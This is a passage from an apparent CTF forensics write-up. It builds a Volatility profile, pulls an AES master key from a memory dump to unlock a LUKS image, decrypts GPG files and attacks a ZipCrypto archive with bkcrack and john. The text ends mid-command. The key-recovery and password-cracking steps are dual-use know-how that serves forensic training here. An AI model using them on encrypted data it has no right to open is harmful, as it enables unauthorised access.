<code>4.4.0-72-lowlatency</code> . Do it manually or use the magic of  <code>sed</code>  command</p>\n<figure class=\"highlight bash\"><figcaption><span>Sed Magic</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~volatility/tools/linux/$ sed -i <span class=\"string\">&#x27;s/$(shell uname -r)/4.4.0-72-lowlatency/g&#x27;</span> Makefile</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to run a <span class=\"pinky\">Ubuntu 16.04.4</span> docker container and mount the current direcotry that contains the tools to build the profile. We can use the variable environment $PWD to indicate the current path easly. Don’t waste your time writing the whole path man !</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo docker run -it --<span class=\"built_in\">rm</span> -v <span class=\"variable\">$PWD</span>:/volatility ubuntu:16.04 /bin/bash</span><br><span class=\"line\">Unable to find image <span class=\"string\">&#x27;ubuntu:16.04&#x27;</span> locally</span><br><span class=\"line\">16.04: Pulling from library/ubuntu</span><br><span class=\"line\">58690f9b18fc: Downloading [=========&gt;                                         ]  8.522MB/46.5MB</span><br><span class=\"line\">b51569e7c507: Download complete</span><br><span class=\"line\">da8ef40b9eca: Download complete</span><br></pre></td></tr></table></figure>\n<p>Just wait until the container is pulled &amp; get your bash !</p>\n<figure class=\"highlight bash\"><figcaption><span>The ubuntu container is ready</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Digest: sha256:91bd29a464fdabfcf44e29e1f2a5f213c6dfa750b6290e40dd6998ac79da3c41</span><br><span class=\"line\">Status: Downloaded newer image <span class=\"keyword\">for</span> ubuntu:16.04</span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\">#</span></span><br></pre></td></tr></table></figure>\n<p>Since our ubuntu container is ready to use. Let’s install the low-latency kernel and the essentials packages for building the profile.</p>\n<figure class=\"highlight bash\"><figcaption><span>Install our packages</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># apt update &amp;&amp; apt install -y linux-image-4.4.0-72-lowlatency linux-headers-4.4.0-72-lowlatency build-essential dwarfdump make zip</span></span><br><span class=\"line\">Get:1 http://security.ubuntu.com/ubuntu xenial-security InRelease [99.8 kB]</span><br><span class=\"line\">Get:2 http://archive.ubuntu.com/ubuntu xenial InRelease [247 kB]</span><br><span class=\"line\">Get:3 http://security.ubuntu.com/ubuntu xenial-security/main amd64 Packages [2051 kB]</span><br><span class=\"line\">Get:4 http://archive.ubuntu.com/ubuntu xenial-updates InRelease [99.8 kB]</span><br><span class=\"line\">Get:5 http://archive.ubuntu.com/ubuntu xenial-backports InRelease [97.4 kB]</span><br><span class=\"line\">Get:6 http://archive.ubuntu.com/ubuntu xenial/main amd64 Packages [1558 kB]</span><br><span class=\"line\">Get:7 http://security.ubuntu.com/ubuntu xenial-security/restricted amd64 Packages [15.9 kB]</span><br></pre></td></tr></table></figure>\n<p>Ah man you’ll wait again until the installation is done! After the installation is finished let’s check our volatility tools inside the container then make the profile !</p>\n<figure class=\"highlight bash\"><figcaption><span>Make The profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># ls</span></span><br><span class=\"line\">bin   dev  home        lib    media  opt   root  sbin  sys  usr  vmlinuz</span><br><span class=\"line\">boot  etc  initrd.img  lib64  mnt    proc  run   srv   tmp  var  volatility</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/<span class=\"comment\"># cd volatility/</span></span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># ls</span></span><br><span class=\"line\">Makefile  Makefile.enterprise  kcore  module.c</span><br><span class=\"line\"></span><br><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># make</span></span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build CONFIG_DEBUG_INFO=y M=<span class=\"string\">&quot;/volatility&quot;</span> modules</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CC [M]  /volatility/module.o</span><br><span class=\"line\">  Building modules, stage 2.</span><br><span class=\"line\">  MODPOST 1 modules</span><br><span class=\"line\">  CC      /volatility/module.mod.o</span><br><span class=\"line\">  LD [M]  /volatility/module.ko</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">dwarfdump -di module.ko &gt; module.dwarf</span><br><span class=\"line\">make -C //lib/modules/4.4.0-72-lowlatency/build M=<span class=\"string\">&quot;/volatility&quot;</span> clean</span><br><span class=\"line\">make[1]: Entering directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br><span class=\"line\">  CLEAN   /volatility/.tmp_versions</span><br><span class=\"line\">  CLEAN   /volatility/Module.symvers</span><br><span class=\"line\">make[1]: Leaving directory <span class=\"string\">&#x27;/usr/src/linux-headers-4.4.0-72-lowlatency&#x27;</span></span><br></pre></td></tr></table></figure>\n<p>Now let’s zip the result of the make command (module.dwarf) and the system map file from the  <code>/boot</code>  :</p>\n<ul>\n<li>\n<p>The system map file contains the Symbols that will be used by volatility to run the plugin correctly. It list function entry points and addresses of kernel data structures of a particular build of a kernel!</p>\n</li>\n<li>\n<p>The  <code>module.dwarf</code>  contains the  <code>vtypes</code>  of this kernel module! To make we can call  <code>vtypes</code>  as the kernel’s data structures. To make it more easy  <code>vtypes</code>  is a small library to define  <code>Validating Types</code>  that will be used by the kernel !</p>\n</li>\n</ul>\n<p>Why we zip the  <code>module.dwarf</code>  and the  <code>System.map</code>  file? It’s simple man! These two files represent the whole profile that will be used by volatility! Volatility requires these 2 files to be in zip to deal with it as profile! Wow man, our profile is coming!</p>\n<p>zip Ubuntu1604.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</p>\n<figure class=\"highlight bash\"><figcaption><span>Zip the 2 files</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@507b1a4007ff:/volatility<span class=\"comment\"># zip Ubuntu1604-low.zip module.dwarf /boot/System.map-4.4.0-72-lowlatency</span></span><br><span class=\"line\">  adding: module.dwarf (deflated 89%)</span><br><span class=\"line\">  adding: boot/System.map-4.4.0-72-lowlatency (deflated 79%)</span><br></pre></td></tr></table></figure>\n<p>Now just leave our ubuntu container. we finished the 1st step of the challenge and you learn how to make a cool &amp; custom linux profile! Now you can copy this zip file to  <code>/plugins/overlays/linux/</code>  directory in your volatility environment.</p>\n<p>Sanity Check please ! Let’s list all the ubuntu profiles available!</p>\n<figure class=\"highlight bash\"><figcaption><span>check the availability of the profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py --info | grep -i ubuntu </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">LinuxUbuntu1604-lowx64     - A Profile <span class=\"keyword\">for</span> Linux Ubuntu1604-low x64</span><br></pre></td></tr></table></figure>\n<p>Cool! we found our new profile recognized by volatility ! Now it’s time to try use it.</p>\n<figure class=\"highlight bash\"><figcaption><span>Test the new profile</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_banner    </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Linux version 4.4.0-72-lowlatency (buildd@lcy01-17) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) <span class=\"comment\">#93-Ubuntu SMP PREEMPT Fri Mar 31 15:25:21 UTC 2017 (Ubuntu 4.4.0-72.93-lowlatency 4.4.49)</span></span><br></pre></td></tr></table></figure>\n<p>Bingo!! Our profile is ready to work! Let’s start the investigation now<br>\nI started checking the bash history!</p>\n<figure class=\"highlight bash\"><figcaption><span>Bash History</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_bash        </span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">Pid      Name       Command Time             Command</span><br><span class=\"line\">-------- ---------- -----------------------  -------</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get install linux-image-4.4.0-72-lowlatency linux-headers-lowlatency</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  reboot</span><br><span class=\"line\">    1229 bash       2017-04-14 07:58:36 UTC  apt-get insta</span><br><span class=\"line\">    1229 bash       2017-04-14 07:59:07 UTC  <span class=\"built_in\">history</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:04:44 UTC  apt-get install lynx gnupg</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:54 UTC  nano /etc/fstab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:06:58 UTC  nano /etc/crypttab</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:08 UTC  <span class=\"built_in\">cd</span> /mnt/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:29 UTC  <span class=\"built_in\">cp</span> -R /media/sf_DUMP/dir* .</span><br><span class=\"line\">    1229 bash       2017-05-05 12:07:38 UTC  ping 8.8.8.8</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:14 UTC  gpg --quick-gen-key <span class=\"string\">&#x27;Troll &lt;abuse@nothere.com&gt;&#x27;</span> rsa4096 cert 1y</span><br><span class=\"line\">    1229 bash       2017-05-05 12:09:49 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+porno+collection&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:27 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=1m_4n_4dul7_n0w -c findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:10:37 UTC  lynx -accept_all_cookies <span class=\"string\">&quot;https://www.google.com/?=password+troll+memes&quot;</span></span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:04 UTC  gpg --<span class=\"built_in\">yes</span> --batch --passphrase=Troll_Tr0ll_TrOll -c end.zip</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:20 UTC  nano dir1/dic_fr_l33t.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:28 UTC  <span class=\"built_in\">rm</span> findme.txt</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:35 UTC  <span class=\"built_in\">rm</span> -rf dir1/</span><br><span class=\"line\">    1229 bash       2017-05-05 12:11:55 UTC  <span class=\"built_in\">dd</span> <span class=\"keyword\">if</span>=/dev/sdb of=/media/sf_DUMP/forensic.img bs=2048</span><br></pre></td></tr></table></figure>\n<p>Let’s analyse this history together to understand what is going on here!</p>\n<ul>\n<li>The user install low-latency kernel</li>\n<li>install lynx : a terminal-based web browser for all Linux distributions</li>\n<li>edit the /etc/fstab.</li>\n<li>edit /etc/crypttab</li>\n<li>copy the directories from media (it can be a flash) partition to  <code>/mnt/</code></li>\n<li>Check the connectivity by pinging the DNS server of google (I used to do the same test :3)</li>\n<li>generate a key with gpg using rsa4096. Something will be encrypted in the next commands! I am sure</li>\n<li>use lynx to search for porno password collection! mmm He want a premium account</li>\n<li>Encrypt  <code>findme.txt</code>  file using gpg !! This will generate an encrypted file  <code>findme.txt.gpg</code></li>\n<li>Search for troll password!</li>\n<li>Encrypt  <code>end.zip</code>  with gpg again! We have  <code>end.zip.gpg</code> , another encrypted file!</li>\n<li>edit a file text called  <code>dic_fr_l33t.txt</code></li>\n<li>remove  <code>findme.txt</code> . I guess we need to recover this file !</li>\n<li>remove the directory that contains the  <code>dic_fr_l33t.txt</code>  file</li>\n</ul>\n<blockquote>\n<p>/etc/fstab: is a configuration table designed to ease the burden of mounting and unmounting file systems to a machine. It is a set of rules used to control how different filesystems are treated each time they are introduced to a system</p>\n</blockquote>\n<blockquote>\n<p>The /etc/crypttab (encrypted device table) file is similar to the fstab file and contains a list of encrypted devices to be unlocked during system boot up. This file can be used for automatically mounting encrypted swap devices or secondary file systems.</p>\n</blockquote>\n<p>Ok the encrypted disk contains a  <code>end.zip.gpg</code>  and  <code>findme.text.gpg</code> . These 2 files are the key of the task! The flag is on these files! So we need to decrypt to disk and mount it!</p>\n<h2 id=\"decrypt-disk-and-mount-it\"><a class=\"markdownIt-Anchor\" href=\"#decrypt-disk-and-mount-it\">#</a> Decrypt Disk and MOUNT IT</h2>\n<p>Dealing with the disk we require  <code>cryptsetup</code>  --a tool to manage plain dm-crypt and LUKS encrypted volumes, to install it, use  <code>sudo apt install cryptsetup-bin</code> .</p>\n<p>Analyzing the disk image to understand what we need to next!</p>\n<p>command  <code>cryptsetup luksDump forensic.img</code>  will return some useful LUKS information:</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS INFO</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LUKS header information <span class=\"keyword\">for</span> forensic.img</span><br><span class=\"line\"></span><br><span class=\"line\">Version:        1</span><br><span class=\"line\">Cipher name:    aes</span><br><span class=\"line\">Cipher mode:    ecb</span><br><span class=\"line\">Hash spec:      sha1</span><br><span class=\"line\">Payload offset: 2048</span><br><span class=\"line\">MK bits:        128</span><br><span class=\"line\">MK digest:      a0 0c 4d c4 4a 53 5c 00 0c c3 33 63 13 5b 2c 41 8e a3 3f a9</span><br><span class=\"line\">MK salt:        5e 84 10 01 a8 19 06 22 6a 7b 1b <span class=\"built_in\">df</span> 35 73 46 8e</span><br><span class=\"line\">                0e 7e f4 68 b0 97 38 81 cf 6d 99 7c 22 82 bd 06</span><br><span class=\"line\">MK iterations:  117625</span><br><span class=\"line\">UUID:           61478c6d-b04e-4f1a-aff6-b4bb3a29cfbe</span><br><span class=\"line\"></span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">        Iterations:             507935</span><br><span class=\"line\">        Salt:                   68 5e 9a ef 39 26 3a 09 3a a2 57 fa b8 a4 d9 6b</span><br><span class=\"line\">                                65 81 49 63 d7 43 41 2a 0e 0a <span class=\"built_in\">cd</span> cb d7 94 ac 01</span><br><span class=\"line\">        Key material offset:    8</span><br><span class=\"line\">        AF stripes:             4000</span><br><span class=\"line\">Key Slot 1: DISABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>It is clear as day that once we have the master key --the one used to control the disk the way we want, we can add a key slot/passphrase.</p>\n<p>As said in the introduction, the master key must be loaded into the RAM, we know it is AES, so using  <code>findaes</code>  tool <span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2Vmb3JnZS5uZXQvcHJvamVjdHMvZmluZGFlcy8=\">here</span></p>\n<p>Then, extract the downloaded zip file<br>\n <code>unzip findaes*.zip</code> <br>\nCompile it<br>\n <code>cd findaes* ; make</code> <br>\nAnd run it against the memory dump<br>\n <code>./findaes memory.raw</code> <br>\nAnd you get this!</p>\n<figure class=\"highlight bash\"><figcaption><span>AES Finally !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Found AES-128 key schedule at offset 0xad9f450:</span><br><span class=\"line\">8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1</span><br></pre></td></tr></table></figure>\n<p>Going further is a routinuous disk encryption operation, with the masterkey in hand, we can generate a new passphrase say  <code>1234</code>  or  <code>p@ssw0rd</code>  for us to access the content.</p>\n<figure class=\"highlight bash\"><figcaption><span>MasterKey !</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> -n <span class=\"string\">&quot;8d 3f 52 7d e5 14 87 2f 59 59 08 95 8d bc 0e d1&quot;</span> | <span class=\"built_in\">tr</span> -d <span class=\"string\">&quot; &quot;</span> | xxd -r -p  &gt; masterkey.key</span><br><span class=\"line\"></span><br><span class=\"line\">cryptsetup luksAddKey --master-key-file=masterkey.key forensic.img                               </span><br><span class=\"line\">Enter new passphrase <span class=\"keyword\">for</span> key slot:</span><br><span class=\"line\">Verify passphrase:</span><br></pre></td></tr></table></figure>\n<p>Let’s see if it is now placed as Key Slot 1!</p>\n<figure class=\"highlight bash\"><figcaption><span>LUKS</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cryptsetup luksDump forensic.img | grep Key.Slot</span><br><span class=\"line\">Key Slot 0: ENABLED</span><br><span class=\"line\">Key Slot 1: ENABLED</span><br><span class=\"line\">Key Slot 2: DISABLED</span><br><span class=\"line\">Key Slot 3: DISABLED</span><br><span class=\"line\">Key Slot 4: DISABLED</span><br><span class=\"line\">Key Slot 5: DISABLED</span><br><span class=\"line\">Key Slot 6: DISABLED</span><br><span class=\"line\">Key Slot 7: DISABLED</span><br></pre></td></tr></table></figure>\n<p>All good!<br>\nNow, we mount it!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo cryptosetup luksOpen forensic.img mydata</span><br><span class=\"line\">Enter passphrase for forensic.img: </span><br><span class=\"line\">mkdir ~/csaw</span><br><span class=\"line\">sudo mount /dev/mapper/mydata ~/csaw</span><br></pre></td></tr></table></figure>\n<p>Just fill in your new passphrase in the previous step, and you’ll have it!</p>\n<p>If you got some permission concern while trying to access the mount point, just switch to root!</p>\n<p>After decrypting the disk and mounting it! We find 2 directories!  <code>dir2</code>  and  <code>lost+found</code> . OK I can say skip &amp; ignore  <code>lost+found</code>  directory. The  <code>dir2</code>  is our target. Let’s get our flag man!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">ls</span> </span><br><span class=\"line\">end.png    findme.txt.gpg      readme.txt</span><br></pre></td></tr></table></figure>\n<p>Let’s check the readme.txt first, Just i am trying to be patient before attacking the  <code>findme.txt.gpg</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Check readme</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> readme.txt</span><br><span class=\"line\">Do you know GPG? So just <span class=\"keyword\">do</span> it to decipher!!!</span><br></pre></td></tr></table></figure>\n<p>Ah man! We know that! We need to decrypt the gpg files. But wait! where is the  <code>end.zip.gpg</code>  file!<br>\nOk it’s not important for me! I guess  <code>findme.txt.gpg</code>  is the flag! Let’s decipher it with  <code>gpg</code>  command line utility. Of course we will use  <code>1m_4n_4dul7_n0w</code>  password!</p>\n<figure class=\"highlight bash\"><figcaption><span>test</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output findme.txt --decrypt findme.txt.gpg <span class=\"comment\"># it will ask you for a password</span></span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ <span class=\"built_in\">cat</span> findme.txt</span><br><span class=\"line\">The flag is not here of course !!!</span><br><span class=\"line\">You must find it :-)</span><br><span class=\"line\">Troll one day troll always ........</span><br></pre></td></tr></table></figure>\n<p>Ah man ! I don’t find the flag! OK still the  <code>end.zip.gpg</code> ! Let’s find this, i guess it’s hiding in  <code>end.png</code>  image</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ sudo binwalk end.png </span><br><span class=\"line\"></span><br><span class=\"line\">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class=\"line\">--------------------------------------------------------------------------------</span><br><span class=\"line\">0             0x0             PNG image, 850 x 300, 8-bit/color RGB, non-interlaced</span><br><span class=\"line\">320           0x140           Zlib compressed data, best compression</span><br><span class=\"line\">917           0x395           Zlib compressed data, best compression</span><br><span class=\"line\">493886        0x7893E         Zip archive data, at least v2.0 to extract, compressed size: 61917, uncompressed size: 61907, name: end.zip.gpg</span><br><span class=\"line\">555953        0x87BB1         End of Zip archive, footer length: 22</span><br></pre></td></tr></table></figure>\n<p>Finally we found it, let’s use  <code>foremost</code>  command to extract our target !</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ foremost end.png   </span><br><span class=\"line\">Processing: end.png</span><br><span class=\"line\">|foundat=end.zip.gpgUT</span><br><span class=\"line\">*|</span><br></pre></td></tr></table></figure>\n<p>A new directory called  <code>output</code>  is created and it contains the extracted files from  <code>end.png</code>  using</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ tree output</span><br><span class=\"line\">output</span><br><span class=\"line\">├── audit.txt</span><br><span class=\"line\">├── png</span><br><span class=\"line\">│   └── 00000000.png</span><br><span class=\"line\">└── zip</span><br><span class=\"line\">    └── 00000964.zip</span><br><span class=\"line\"></span><br><span class=\"line\">2 directories, 3 files</span><br></pre></td></tr></table></figure>\n<p>OK let’s unzip the  <code>00000964.zip</code>  file and decipher the  <code>end.zip.gpg</code>  file using  <code>Troll_Tr0ll_TrOll</code>  password and get our flag</p>\n<figure class=\"highlight bash\"><figcaption><span>Investigate end.png</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ unzip output/zip/00000964.zip </span><br><span class=\"line\">Archive:  output/zip/00000964.zip</span><br><span class=\"line\">  inflating: end.zip.gpg</span><br><span class=\"line\">4n6nk8s@csaw2022:~/csaw/dir2$ gpg --output end.zip --decrypt end.zip.gpg</span><br></pre></td></tr></table></figure>\n<p>Ah finally there is a flag.gif file in end.zip file but wait!! the zip file is protected!</p>\n<p>We’ve noticed that the encryption is ZipCrypto Deflate which is similar to the other chall, crackable by just knowing 12 bytes of whats inside the zip, 8 of which must be contiguous.<br>\nWe’ve went ahead, used the header of a GIF file, and digging more into the GIF file structure, we’ve came to know that in most of the GIF files there is a constant text ‘NETSCAPE’ at the hexadecimal offset 0x310 which fulfills our needs, 8 bytes contiguous plus the header, we’ve got more than 12 bytes.</p>\n<p>The header is just  <code>GIF89a</code>  at offset 0x0.</p>\n<p><img data-src=\"https://i.imgur.com/RH9goSf.png\" alt=\"\"></p>\n<p>You can get bkcrack from <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tpbWNpODYvYmtjcmFjaw==\">here</span></p>\n<p>-C to specify the ciphered zip, -c for the target file -x to specify known bytes at some offset and -d to get the deciphered data once the process is done, and keys were found!</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./bkcrack -C end.zip -c flag.gif -x 0 474946383961 -x 0x310 4E4554534415045322E30 -d deciphered</span><br></pre></td></tr></table></figure>\n<p>Unfortunately, it ended with  <code>Could Not find the keys.</code></p>\n<p>However we were not lucky to crack the zip open using bkcrack again.</p>\n<p>Don’t worry dude! we have rockyou and john! Let’s give bruteforcing a chance. We can extract the password hash with  <code>zip2john</code>  command!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ zip2john end.zip &gt; zip.hash  </span><br><span class=\"line\">ver 2.0 efh 5455 efh 7875 end.zip/flag.gif PKZIP Encr: TS_chk, cmplen=61563, decmplen=90082, crc=18A1C7A3 ts=8050 cs=8050 <span class=\"built_in\">type</span>=8</span><br></pre></td></tr></table></figure>\n<p>Now it’s time to bruteforce the hash with rockyou!</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ john --wordlist=<span 